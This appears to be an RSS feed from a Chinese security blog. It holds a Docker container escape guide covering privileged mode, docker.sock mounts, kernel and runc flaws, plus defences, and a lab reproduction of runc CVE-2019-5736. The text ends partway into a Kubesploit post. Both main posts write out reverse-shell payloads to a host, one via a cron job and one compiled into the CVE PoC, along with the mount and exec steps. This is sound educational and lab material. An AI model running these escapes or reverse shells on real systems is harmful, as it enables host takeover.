<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Hexo</title>
    <link>https://m01ly.github.io/</link>
    
    <atom:link href="https://m01ly.github.io/atom.xml" rel="self" type="application/rss+xml"/>
    
    <description>description123456</description>
    <pubDate>Tue, 04 Jan 2022 07:07:36 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>docker逃逸常用方法</title>
      <link>https://m01ly.github.io/2022/01/04/pt-docker-escape/</link>
      <guid>https://m01ly.github.io/2022/01/04/pt-docker-escape/</guid>
      <pubDate>Tue, 04 Jan 2022 06:27:37 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-背景"><a href="#1-背景" class="headerlink" title="1 背景"></a>1 背景</h1><p>容器逃逸常发生在后渗透阶段中，攻击者通过应用层面漏洞进入容器内，由于容器本身生命周期并不稳定，逃逸到宿主机是必要操作。 本文将从实战角度记录容器逃逸各类操作。下面是网上找的一张docker的架构图。近些年，Docker逃逸所利用的漏洞大部分都发生在shim和runc上，每一次出现相关漏洞都能引起相当大的关注。</p><p><img src="/2022/01/04/pt-docker-escape/1641278016580.png" alt="1641278016580"></p><h1 id="2-Docker逃逸原理"><a href="#2-Docker逃逸原理" class="headerlink" title="2 Docker逃逸原理"></a>2 Docker逃逸原理</h1><p>因为Docker所使用的是隔离技术，就导致了容器内的进程无法看到外面的进程，但外面的进程可以看到里面，所以如果一个容器可以访问到外面的资源，甚至是获得了宿主主机的权限，这就叫做“Docker逃逸”。</p><p>目前产生Docker逃逸的原因总共有三种：</p><ol><li>由内核漏洞引起。</li><li>由Docker软件设计引起。</li><li>由特权模式与配置不当引起。</li></ol><p>接下来依次对这三种逃逸方法做简单说明。</p><h2 id="2-1-由于内核漏洞引起的逃逸"><a href="#2-1-由于内核漏洞引起的逃逸" class="headerlink" title="2.1 由于内核漏洞引起的逃逸"></a>2.1 由于内核漏洞引起的逃逸</h2><p>因为Docker是直接共享的宿主主机内核，所以当宿主主机的内核存在安全漏洞时会一并影响Docker的安全，导致可能会造成Docker逃逸。</p><p>操作系统内核漏洞主要就是利用大脏牛（CVE-2016-5195），依赖于内存页的写时复制机制来逃逸到宿主机，exp链接：<a href="https://github.com/scumjr/dirtycow-vdso%EF%BC%8C%E4%B8%8D%E8%BF%87%E4%B8%8D%E6%98%AF%E6%AF%8F%E4%B8%AAlinux%E5%8F%91%E8%A1%8C%E7%89%88%E9%83%BD%E9%80%9A%E7%94%A8">https://github.com/scumjr/dirtycow-vdso，不过不是每个linux发行版都通用</a>.</p><h2 id="2-2-由于Doker软件设计引起的逃逸-应用程序漏洞"><a href="#2-2-由于Doker软件设计引起的逃逸-应用程序漏洞" class="headerlink" title="2.2 由于Doker软件设计引起的逃逸/应用程序漏洞"></a>2.2 由于Doker软件设计引起的逃逸/应用程序漏洞</h2><p>目前通过应用程序漏洞逃逸的漏洞主要有两个：</p><ul><li><p>CVE-2019-5736（runc）</p></li><li><p>CVE-2020-15257（containerd）</p></li></ul><h3 id="2-2-1-CVE-2019-5736"><a href="#2-2-1-CVE-2019-5736" class="headerlink" title="2.2.1 CVE-2019-5736"></a>2.2.1 CVE-2019-5736</h3><p>  其中CVE-2019-5736是runc相关漏洞，该漏洞允许攻击者重写宿主机上的runc 二进制文件，攻击者可以在宿主机上以root身份执行命令。 该漏洞有利用条件，即容器exp执行后，需要受害者在宿主机上通过docker exec命令进入该容器。exp链接：<a href="https://github.com/Frichetten/CVE-2019-5736-PoC%E3%80%82%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E6%9F%A5%E7%9C%8B%EF%BC%9A">https://github.com/Frichetten/CVE-2019-5736-PoC。漏洞复现查看：</a></p><h3 id="2-2-2-CVE-2020-15257"><a href="#2-2-2-CVE-2020-15257" class="headerlink" title="2.2.2 CVE-2020-15257"></a>2.2.2 CVE-2020-15257</h3><p>containerd 是一个控制 runC 的守护进程，提供命令行客户端和API。当在docker使用–net=host参数启动且与宿主机共享net namespace时，docker容器会暴露containerd-shim 监听的 Unix 域套接字,攻击者可以绕过访问权限访问 containerd 的控制API 直接操作containerd-shim ，来控制容器，从而实现Docker容器逃逸。exp: <a href="https://github.com/cdk-team/CDK/releases">https://github.com/cdk-team/CDK/releases</a></p><h2 id="2-3-由于特权模式-目录挂载引起的逃逸"><a href="#2-3-由于特权模式-目录挂载引起的逃逸" class="headerlink" title="2.3 由于特权模式+目录挂载引起的逃逸"></a>2.3 由于特权模式+目录挂载引起的逃逸</h2><p>这一种逃逸方法较其他两种来说用的更多。特权模式在6.0版本的时候被引入Docker，其核心作用是允许容器内的root拥有外部物理机的root权限，而此前在容器内的root用户只有外部物理机普通用户的权限。</p><h3 id="2-3-1-磁盘挂载"><a href="#2-3-1-磁盘挂载" class="headerlink" title="2.3.1 磁盘挂载"></a>2.3.1 磁盘挂载</h3><p>（1）使用特权模式启动容器后（docker run –privileged）：Docker容器被允许可以访问主机上的所有设备、可以获取大量设备文件的访问权限、可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务contrab等方式在宿主机执行命令。(反弹shell)</p><p>（2）使用功能机制也会造成Docker逃逸。Linux内核自版本2.2引入了功能机制（Capabilities），打破了UNIX/LINUX操作系统中超级用户与普通用户的概念，允许普通用户执行超级用户权限方能运行的命令。例如当容器以–cap-add=SYSADMIN启动，Container进程就被允许执行mount、umount等一系列系统管理命令，如果攻击者此时再将外部设备目录挂载在容器中就会发生Docker逃逸。</p><h3 id="2-3-2-容器挂载不当"><a href="#2-3-2-容器挂载不当" class="headerlink" title="2.3.2 容器挂载不当"></a>2.3.2 容器挂载不当</h3><p>使用者将宿主机/var/run/docker.sock文件挂载到容器中，目的是能在容器中也能操作docker。 </p><h1 id="3-docker-逃逸实例"><a href="#3-docker-逃逸实例" class="headerlink" title="3 docker 逃逸实例"></a>3 docker 逃逸实例</h1><h2 id="3-1-特权模式"><a href="#3-1-特权模式" class="headerlink" title="3.1 特权模式"></a>3.1 特权模式</h2><p> 特权模式逃逸是一种最简单有效的逃逸方法，攻击者可以通过挂载宿主机目录到容器某个目录下，直接通过命令、写ssh公钥和crontab等getshell。 </p><p>（1）创建容器时通过添加–privileged=true参数，将容器以特权模式起</p><pre class="line-numbers language-bash"><code class="language-bash">docker run -itd --name privilegeTest –-privileged<span class="token operator">=</span>true mongo:3.6-streth<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在k8s中，在pod的yaml配置中添加如下配置时，也会以特权模式启动容器</p><pre><code>securityContext:  privileged: true</code></pre><p><img src="/2022/01/04/pt-docker-escape/1641279769110.png" alt="1641279769110"></p><p>（2） 特权模式起的容器，实战可通过cat /proc/self/status |grep Cap命令判断当前容器是否通过特权模式起（000000xfffffffff代表为特权模式起） </p><p><img src="/2022/01/04/pt-docker-escape/1641279079652.png" alt="1641279079652"></p><p>（3）fdisk -l命令查看宿主机设备为/dev/vda1，通过mount命令将宿主机根目录挂载进容器目录的test中.</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">fdisk</span> -l<span class="token function">mount</span> /dev/sda1 /home/test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（4）使用chroot改变根目录，接下来可以直接执行命令或写crontab</p><p><img src="/2022/01/04/pt-docker-escape/1641279217423.png" alt="1641279217423"></p><p>（5）在计划任务里写入一个反弹shell：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">'* * * * * bash -i >&amp; /dev/tcp/x.x.x.x/7777 0>&amp;1'</span><span class="token operator">>></span> /home/test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（6）在Docker上开启netcat监听7777端口，成功接收到宿主主机的Shell，实现Docker逃逸。</p><h2 id="3-2-容器挂载不当"><a href="#3-2-容器挂载不当" class="headerlink" title="3.2 容器挂载不当"></a>3.2 容器挂载不当</h2><p>容器挂载不当导致的逃逸根本原因在于业务需求或使用者图方便把危险目录直接挂载到容器中。 当然，根据使用者挂的目录不同，利用方式肯定也都不同。举一个比较常见的例子：使用者将宿主机/var/run/docker.sock文件挂载到容器中，目的是能在容器中也能操作docker。</p><p>（1）创建挂载/var/run/docker.sock文件的容器</p><pre class="line-numbers language-bash"><code class="language-bash">docker run -itd --name mongo_sock -v /var/run/docker.sock:/var/run/docker.sock mongo:3.6-stretch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）实战中通过find命令，在容器内可查找类似docker.sock等高危目录和文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> / -name docker.sock<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）cat /etc/os-release查看当前linux发型版本，准备安装docker客户端，方便操作docker</p><p><img src="/2022/01/04/pt-docker-escape/1641279541683.png" alt="1641279541683"></p><p>（4）访问<a href="https://download.docker.com/linux/debian/dists/%EF%BC%8C%E6%A0%B9%E6%8D%AE%E9%80%89%E6%8B%A9%E5%85%B7%E4%BD%93%E5%88%86%E6%94%AF%EF%BC%8C%E5%A6%82stretch%E5%B0%B1%E5%8E%BBhttps://download.docker.com/linux/debian/dists/stretch/pool/stable/amd64/%E4%B8%8B%E8%BD%BD.deb%E7%BB%93%E5%B0%BE%E7%9A%84%E5%AE%89%E8%A3%85%E6%96%87%E4%BB%B6">https://download.docker.com/linux/debian/dists/，根据选择具体分支，如stretch就去https://download.docker.com/linux/debian/dists/stretch/pool/stable/amd64/下载.deb结尾的安装文件</a> 使用这种方式安装的好处是容器内一般都缺少很多基础组件，如果通过apt-get安装实测20分钟也装不完 .</p><p>（5）随便找个镜像挂载宿主机根目录到容器的/host目录下，之后就可以进行任意操作了 </p><pre class="line-numbers language-bash"><code class="language-bash">docker run -it -v /:/host rabbitmq:3-management-alpine <span class="token function">bash</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/01/04/pt-docker-escape/1641279608868.png" alt="1641279608868"></p><h1 id="4-容器渗透常用命令"><a href="#4-容器渗透常用命令" class="headerlink" title="4 容器渗透常用命令"></a>4 容器渗透常用命令</h1><p>查看当前环境是否为容器 cat /proc/1/cgroup看回显结果中是否有docker（这个方法一般要比ls /.dockerenv要准确，实测有些容器根目录下确实没有.dockerenv）</p><p>查看容器操作系统详细信息 cat /etc/os-release</p><p>查看宿主机内核信息 uname -a</p><p>查看容器内进程的capability grep CapEff /proc/self/status 在其他机器上执行capsh –decode=value查看具体权限，value为前一个命令输出结果</p><p>查看环境变量 env（环境变量中可能存在敏感信息，如password）</p><p>危险挂载文件查找，如docker.sock find / -name docker.sock</p><h1 id="5-Docker逃逸防御"><a href="#5-Docker逃逸防御" class="headerlink" title="5 Docker逃逸防御"></a>5 Docker逃逸防御</h1><ul><li>更新Docker版本到03.1及更高版本——CVE-2019-14271、覆盖CVE-2019-5736。</li><li>runc版本 &gt;1.0-rc6</li><li>k8s 集群版本&gt;1.12</li><li>Linux内核版本&gt;=2.6.22——CVE-2016-5195(脏牛)</li><li>Linux内核版本&gt;=4.14——CVE-2017–1000405(大脏牛)，未找到docker逃逸利用过程，但存在逃逸风险。</li><li>不建议以root权限运行Docker服务。</li><li>不建议以privileged（特权模式）启动Docker。</li><li>不建议将宿主机目录挂载至容器目录。</li><li>不建议将容器以—cap-add=SYSADMIN启动，SYSADMIN意为container进程允许执行mount、umount等一系列系统管理操作，存在容器逃逸风险。</li></ul><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol><li><a href="https://www.cnblogs.com/xiaozi/p/13423853.html">docker逃逸过程详情</a>  一个完整的逃逸利用方法   超级棒</li><li><a href="https://bbs.huaweicloud.com/blogs/detail/278683">容器逃逸常用方法</a>  很详细</li><li><a href="http://www.hackdig.com/09/hack-480834.htm">五种方式教你用特权容器逃逸</a>  挂载目录的具体案例</li><li><a href="https://www.freebuf.com/articles/container/245153.html">Docker逃逸原理</a>  还行</li><li><a href="https://www.kingkk.com/2021/01/%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">配置不当导致的容器逃逸</a></li><li><a href="https://www.kingkk.com/2021/01/%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">利用 Linux 内核漏洞实现 Docker 逃逸</a></li><li><a href="https://www.freebuf.com/articles/system/221319.html">Docker容器安全性分析</a>  SDLC可以加进去</li><li><a href="https://www.kingkk.com/2021/01/%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"> 云原生之Kubernetes安全 </a> 以后看</li></ol>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</category>
      
      
      <comments>https://m01ly.github.io/2022/01/04/pt-docker-escape/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>kube-bench工具使用--</title>
      <link>https://m01ly.github.io/2021/12/23/security-tools-kubebench/</link>
      <guid>https://m01ly.github.io/2021/12/23/security-tools-kubebench/</guid>
      <pubDate>Thu, 23 Dec 2021 05:31:27 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/">安全工具</category>
      
      
      <comments>https://m01ly.github.io/2021/12/23/security-tools-kubebench/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Docker逃逸漏洞复现（CVE-2019-5736）</title>
      <link>https://m01ly.github.io/2021/12/21/security-cve-recurrent-CVE-2019-5736/</link>
      <guid>https://m01ly.github.io/2021/12/21/security-cve-recurrent-CVE-2019-5736/</guid>
      <pubDate>Tue, 21 Dec 2021 02:30:25 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a><strong>1 前言</strong></h1><h2 id="1-1-概述"><a href="#1-1-概述" class="headerlink" title="1.1 概述"></a>1.1 概述</h2><p>2019年2月11日，runC的维护团队报告了一个新发现的漏洞，SUSE Linux GmbH高级软件工程师Aleksa Sarai公布了影响Docker, containerd, Podman, CRI-O等默认运行时容器runc的严重漏洞CVE-2019-5736。</p><p>漏洞会对IT运行环境带来威胁，漏洞利用会触发容器逃逸、影响整个容器主机的安全，最终导致运行在该主机上的其他容器被入侵。漏洞影响AWS, Google Cloud等主流云平台。</p><p>攻击者可以通过特定的容器镜像或者exec操作可以获取到宿主机的runC执行时的文件句柄并修改掉runc的二进制文件，从而获取到宿主机的root执行权限。</p><h2 id="1-2漏洞原理"><a href="#1-2漏洞原理" class="headerlink" title="1.2漏洞原理"></a><strong>1.2漏洞原理</strong></h2><p>漏洞点在于runC，RunC是一个容器运行时，最初是作为Docker的一部分开发的，后来作为一个单独的开源工具和库被提取出来。作为“低级别”容器运行时，runC主要由“高级别”容器运行时（例如Docker）用于生成和运行容器，尽管它可以用作独立工具。像Docker这样的“高级别”容器运行时通常会实现镜像创建和管理等功能，并且可以使用runC来处理与运行容器相关的任务：创建容器、将进程附加到现有容器等。在Docker 18.09.2之前的版本中使用了的runc版本小于1.0-rc6，因此允许攻击者重写宿主机上的runc 二进制文件，攻击者可以在宿主机上以root身份执行命令。</p><h2 id="1-3-利用方式"><a href="#1-3-利用方式" class="headerlink" title="1.3 利用方式"></a><strong>1.3 利用方式</strong></h2><p>docker 18.09.2之前的runc存在漏洞，攻击者可以修改runc的二进制文件导致提权。</p><p><strong>前提条件：</strong></p><p>要利用此漏洞，您需要在容器内拥有 root (uid 0)。</p><h2 id="1-4-影响版本"><a href="#1-4-影响版本" class="headerlink" title="1.4 影响版本"></a><strong>1.4 影响版本</strong></h2><p>docker version &lt;=18.09.2 RunC version &lt;=1.0-rc6</p><h1 id="2-安装有漏洞的docker"><a href="#2-安装有漏洞的docker" class="headerlink" title="2 安装有漏洞的docker"></a>2 安装有漏洞的docker</h1><p><strong>环境安装</strong></p><p>（1）卸载已将安装的docker</p><p>（2）列出可用版本</p><pre class="line-numbers language-bash"><code class="language-bash">yum list docker-ce --showduplicates <span class="token operator">|</span> <span class="token function">sort</span> -r<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/21/security-cve-recurrent-CVE-2019-5736/1640054924227.png" alt="1640054924227"></p><p>（3）安装有漏洞版本&lt;=18.09.2，这里选择18.06.0.ce-3.el7版本</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> yum <span class="token function">install</span> docker-ce-18.06.0.ce-3.el7 -y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看版本：看到docker版本为18.06.0.ce&lt;18.09.2，runc版本为1.0.0 rc5&lt;1.0-rc6。</p><p><strong>值得注意的是高版本docker中使用runc -v来runc查版本。</strong></p><pre class="line-numbers language-bash"><code class="language-bash">docker -vdocker-runc -v<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/12/21/security-cve-recurrent-CVE-2019-5736/1640055271415.png" alt="1640055271415"></p><p>（5）在受害者机器上启动一个容器49bd670396f4，搭建攻击环境</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@archery-sec9002 supper-user<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker pull nginx</span><span class="token punctuation">[</span>root@archery-sec9002 supper-user<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker run --name nginx-test -p 8080:80 -d nginx</span><span class="token punctuation">[</span>root@archery-sec9002 supper-user<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker ps -a</span>CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                  NAMES49bd670396f4        nginx               <span class="token string">"/docker-entrypoint.…"</span>   4 seconds ago       Up 3 seconds        0.0.0.0:8080-<span class="token operator">></span>80/tcp   nginx-test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3 漏洞复现"></a>3 漏洞复现</h1><p>漏洞复现整体过程如下图所示：其中，下图中为了方便复现，制作payload过程 我们直接在受害者机器上制作。</p><p>攻击者机器IP为：10.65.103.67（archery-sec9001）。 </p><p>受害者机器IP为：10.65.103.68（archery-sec9002）</p><p><img src="/2021/12/21/security-cve-recurrent-CVE-2019-5736/1640068592282.png" alt="1640068592282"></p><h2 id="3-1-受害者机器制作payload"><a href="#3-1-受害者机器制作payload" class="headerlink" title="3.1 受害者机器制作payload"></a>3.1 受害者机器制作payload</h2><p>（1）受害者机器上生成payload</p><p>下载CVE-2019-5736编译go脚本生成攻击payload。（<a href="https://github.com/Frichetten/CVE-2019-5736-PoC%EF%BC%89,%E5%B0%86go%E8%84%9A%E6%9C%AC%E4%B8%ADpayload%E4%BF%AE%E6%94%B9%E4%B8%BA%E5%8F%8D%E5%BC%B9shell%E7%9A%84payload%EF%BC%8C%E8%AE%BE%E7%BD%AEnc%E7%9B%91%E5%90%AC%E5%9C%B0%E5%9D%80%E3%80%82">https://github.com/Frichetten/CVE-2019-5736-PoC）,将go脚本中payload修改为反弹shell的payload，设置nc监听地址。</a></p><pre class="line-numbers language-bash"><code class="language-bash">var payload<span class="token operator">=</span><span class="token string">"#!/bin/bash \n bash -i >&amp; /dev/tcp/10.65.103.67/1234 0>&amp;1"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/21/security-cve-recurrent-CVE-2019-5736/1640056311451.png" alt="1640056311451"></p><p>（2）安装Go环境</p><p>该工具需要GO环境，这里使用1.14版本。非版本可能不兼容。</p><p>使用二进制文件安装【安装】<br>标准官网：<a href="https://golang.org/">https://golang.org/</a> 需要墙<br>镜像官网：<a href="https://golang.google.cn/dl/">https://golang.google.cn/dl/</a> 【国内推荐】</p><p>a.下载文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">wget</span> https://dl.google.com/go/go1.14.linux-amd64.tar.gz<span class="token function">tar</span> -zxf go1.14.linux-amd64.tar.gz -C /usr/local<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>b.配置环境变量</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">vi</span> /etc/profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在/etc/profile文件末尾添加以下配置，输入 :wq保存</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#golang env config</span><span class="token function">export</span> GO111MODULE<span class="token operator">=</span>on<span class="token function">export</span> GOROOT<span class="token operator">=</span>/usr/local/go <span class="token function">export</span> GOPATH<span class="token operator">=</span>/home/gopath<span class="token function">export</span> PATH<span class="token operator">=</span><span class="token variable">$PATH</span><span class="token keyword">:</span><span class="token variable">$GOROOT</span>/bin:<span class="token variable">$GOPATH</span>/bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里的GO111MODULE配置是go1.11后出的一种新的包管理go modules方式代替vendor机制，可以不需要GOPATH，项目代码也不一定要放在GOPATH下面 可参考<a href="https://www.cnblogs.com/apocelipes/p/9534885.htm">https://www.cnblogs.com/apocelipes/p/9534885.htm</a><br>GO111MODULE=auto 自动<br>GO111MODULE=on 使用go modules，不会在vendor和gopath找依赖 【推荐新版都用这种】<br>GO111MODULE=off 使用vendor 或者gotpath</p><p>配置文件生效</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">source</span> /etc/profile go version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/12/21/security-cve-recurrent-CVE-2019-5736/1639728761904.png" alt="1639728761904"></p><p>（3）编译脚本：生成一个可执行的脚本main</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> CVE-2019-5736-PoCCGO_ENABLED<span class="token operator">=</span>0 GOOS<span class="token operator">=</span>linux GOARCH<span class="token operator">=</span>amd64 go build main.go<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/12/21/security-cve-recurrent-CVE-2019-5736/1640056013947.png" alt="1640056013947"></p><h2 id="3-2-payload传入受害者容器中"><a href="#3-2-payload传入受害者容器中" class="headerlink" title="3.2 payload传入受害者容器中"></a>3.2 payload传入受害者容器中</h2><p>（1）将该payload(main文件)拷贝到docker容器中（这就是模拟攻击者获取了docker容器权限，在容器中上传payload进行docker逃逸）并将main文件修改权限可执行。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@archery-sec9002 CVE-2019-5736-PoC<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker cp main 49bd670396f4:/home</span><span class="token punctuation">[</span>root@archery-sec9002 CVE-2019-5736-PoC<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker exec -it 49bd670396f4 /bin/sh</span>root@49bd670396f4:/<span class="token comment" spellcheck="true"># cd home</span>root@49bd670396f4:/home<span class="token comment" spellcheck="true"># chmod 777 main</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/12/21/security-cve-recurrent-CVE-2019-5736/1640066964932.png" alt="1640066964932"></p><h2 id="3-3-攻击"><a href="#3-3-攻击" class="headerlink" title="3.3 攻击"></a>3.3 攻击</h2><p> 将该payload拷贝到docker容器中（这就是模拟攻击者获取了docker容器权限，在容器中上传payload进行docker逃逸） </p><p>（1）在49bd670396f4容器中执行payload文件main</p><p>执行payload，等待受害者去启动docker容器。（如果ctf比赛选手说容器启动有问题，引诱管理员启动docker就中招了）</p><pre class="line-numbers language-bash"><code class="language-bash">root@49bd670396f4:/home<span class="token comment" spellcheck="true"># ./main</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/21/security-cve-recurrent-CVE-2019-5736/1640067151695.png" alt="1640067151695"></p><p>(2) 攻击者同步开启nc监听（ip为10.65.103.67，监听端口为1234、与main中的payload一致。）</p><pre class="line-numbers language-bash"><code class="language-bash">nc -vv -lp 1234<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/21/security-cve-recurrent-CVE-2019-5736/1640067506910.png" alt="1640067506910"></p><p>(3) 在xshell重新打开一个选项卡，进入容器。（sh启动），模拟受害者重新打开容器时。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@archery-sec9002 CVE-2019-5736-PoC<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># docker exec -it 49bd670396f4 /bin/sh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/12/21/security-cve-recurrent-CVE-2019-5736/1640067231664.png" alt="1640067231664"></p><p>观察容器中</p><p><img src="/2021/12/21/security-cve-recurrent-CVE-2019-5736/1640067250063.png" alt="1640067250063"></p><p>(4) 受害者启动docker容器时，触发payload，成功反弹shell。即容器逃逸成功，已进入受害者机器，并且是root权限。</p><p><img src="/2021/12/21/security-cve-recurrent-CVE-2019-5736/1640067382867.png" alt="1640067382867"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.freebuf.com/articles/web/258398.html">https://www.freebuf.com/articles/web/258398.html</a></p><p><a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a>  漏洞POC</p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</category>
      
      
      <comments>https://m01ly.github.io/2021/12/21/security-cve-recurrent-CVE-2019-5736/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>kube-hunter工具使用--</title>
      <link>https://m01ly.github.io/2021/12/20/security-tools-kubehunter/</link>
      <guid>https://m01ly.github.io/2021/12/20/security-tools-kubehunter/</guid>
      <pubDate>Mon, 20 Dec 2021 05:31:27 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/">安全工具</category>
      
      
      <comments>https://m01ly.github.io/2021/12/20/security-tools-kubehunter/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>kubesploit工具使用--一个针对容器化环境的跨平台后渗透利用工具</title>
      <link>https://m01ly.github.io/2021/12/17/security-tools-kubesploit/</link>
      <guid>https://m01ly.github.io/2021/12/17/security-tools-kubesploit/</guid>
      <pubDate>Fri, 17 Dec 2021 05:31:27 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="1-Kubesploit介绍"><a href="#1-Kubesploit介绍" class="headerlink" title="1 Kubesploit介绍"></a>1 Kubesploit介绍</h1><h2 id="1-1-Kubesploit是什么"><a href="#1-1-Kubesploit是什么" class="headerlink" title="1.1 Kubesploit是什么"></a>1.1 Kubesploit是什么</h2><p><a href="https://github.com/cyberark/kubesploit">Kubesploit</a>是一个针对容器化环境的跨平台后渗透利用工具。Kubesploit是一个功能强大的跨平台后渗透漏洞利用HTTP/2命令&amp;控制服务器和代理工具，该工具基于Golang开发，基于Merlin项目实现其功能，主要针对的是容器化环境的安全问题。</p><p>我们的主要目标是提高社区对容器化环境安全的认识，并改进各种网络中实施的缓解措施。所有这些都是通过一个框架来实现的，这个框架为PT团队和红队成员在这些环境中的活动提供了适当的工具。使用这些工具将帮助你评估这些环境的优势，并进行必要的更改以保护它们。</p><p>由于C&amp;C和代理基础设施已经由Merlin完成，我们只需要继承Go解释器（“Yaegi”）就可以在服务器端和代理运行Golang代码了。</p><p>它允许我们在Golang中编写模块，为模块提供更大的灵活性，并动态加载新模块。这是一个正在进行的项目，我们计划在未来添加更多与Docker和Kubernetes相关的模块。</p><h2 id="1-2-Kubesploit能干什么"><a href="#1-2-Kubesploit能干什么" class="headerlink" title="1.2 Kubesploit能干什么"></a>1.2 Kubesploit能干什么</h2><h3 id="1-2-1-功能介绍"><a href="#1-2-1-功能介绍" class="headerlink" title="1.2.1 功能介绍"></a>1.2.1 功能介绍</h3><p>Kubesploit主要的功能就体现在其中的module，存放了多个可利用的攻击代码(POC)。我们先看看这些module能干些什么？</p><p><img src="/2021/12/17/security-tools-kubesploit/1639728261432.png" 